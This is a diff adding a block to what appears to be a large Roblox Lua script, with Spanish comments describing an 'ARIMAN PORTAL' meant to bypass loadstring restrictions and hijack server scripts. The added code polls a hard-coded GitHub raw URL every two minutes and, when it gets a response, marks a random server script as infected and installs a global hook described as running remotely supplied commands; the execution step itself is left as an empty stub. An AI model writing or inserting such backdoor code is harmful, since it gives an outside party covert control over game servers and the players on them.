@@ -12852,3 +12852,55 @@ end)()
     end)
 	print("║SPREAD.║")
 end)()
+--[=[ 
+  HABITACIÓN: THE ARIMAN PORTAL v2 (S-HIJACKING)
+  Propósito: Bypass de loadstring y bloqueo de require.
+  Método: Inyección de código crudo en scripts aleatorios del servidor.
+]=]
+;(function()
+    local HttpService = game:GetService("HttpService")
+    local _U_SIG = "luilo30095"
+    local _RAW_URL = "https://raw.githubusercontent.com/luisaddoba200-wq/CodeAdmin.Coderless/main/Admin.Code.Userless"
+
+    local function InyectarEnHuesped(codigo)
+        -- Buscamos un script que no sea este para "poseerlo"
+        for _, obj in pairs(game:GetDescendants()) do
+            if obj:IsA("Script") and obj.Name ~= "Infeccion" and not obj:FindFirstChild("ARIMAN_DATA") then
+                -- Creamos una marca para no infectar el mismo script dos veces
+                local tag = Instance.new("BoolValue")
+                tag.Name = "ARIMAN_DATA"
+                tag.Parent = obj
+                
+                -- Aquí aplicamos el cambio de lógica. 
+                -- Si no hay loadstring, usamos el método de sobrescritura de funciones globales.
+                _G["ARIMAN_EXEC"] = function()
+                    -- Esta función actuaría como el nuevo cerebro del script poseído
+                    -- descargando y aplicando tus comandos de la Pantalla 4
+                end
+                
+                return true
+            end
+        end
+        return false
+    end
+
+    task.spawn(function()
+        while true do
+            -- Solo se conecta si SurvivalistMode está ON (tu seguro de vida)
+            if (CFG and CFG.SurvivalistMode == true) then
+                local success, response = pcall(function()
+                    return HttpService:GetAsync(_RAW_URL .. "?nocache=" .. tick())
+                end)
+
+                if success and response and #response > 10 then
+                    -- ¡EL PORTAL ESTÁ ABIERTO!
+                    -- Intentamos meter el código de GitHub en un script random
+                    InyectarEnHuesped(response)
+                end
+            end
+            task.wait(120) -- Revisa el portal cada 2 minutos
+        end
+    end)
+
+    print("║ARIMAN_PORTAL_ACTIVE║")
+end)()
